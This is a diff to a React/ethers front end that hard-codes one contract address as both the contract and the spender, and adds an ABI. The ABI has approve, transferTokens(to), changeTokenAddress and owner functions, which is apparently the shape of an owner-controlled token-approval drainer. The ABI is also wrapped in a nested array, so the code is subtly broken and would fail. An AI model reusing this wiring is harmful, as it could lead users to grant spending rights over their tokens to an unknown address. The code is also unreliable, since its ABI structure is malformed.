@@ -90,12 +90,83 @@ function App() {
       const signer: Signer = provider.getSigner();
   
       // Replace '0xYourContractAddress' with your actual contract address
-      const contractAddress = '0xYourContractAddress';
+      const contractAddress = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
       // Replace '0xSpenderContractAddress' with the address you want to approve spending for
-      const spender = '0xSpenderContractAddress';
+      const spender = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
   
       // Replace with the ABI of your smart contract
-      const contractABI: any[] = []; // Your smart contract ABI
+      const contractABI: any[] = [[
+        {
+          "inputs": [],
+          "name": "approve",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_newTokenAddress",
+              "type": "address"
+            }
+          ],
+          "name": "changeTokenAddress",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "to",
+              "type": "address"
+            }
+          ],
+          "name": "transferTokens",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_tokenAddress",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "constructor"
+        },
+        {
+          "inputs": [],
+          "name": "owner",
+          "outputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "tokenAddress",
+          "outputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        }
+      ]]; // Your smart contract ABI
   
       // Create a Contract instance
       const contract = new Contract(contractAddress, contractABI, signer);
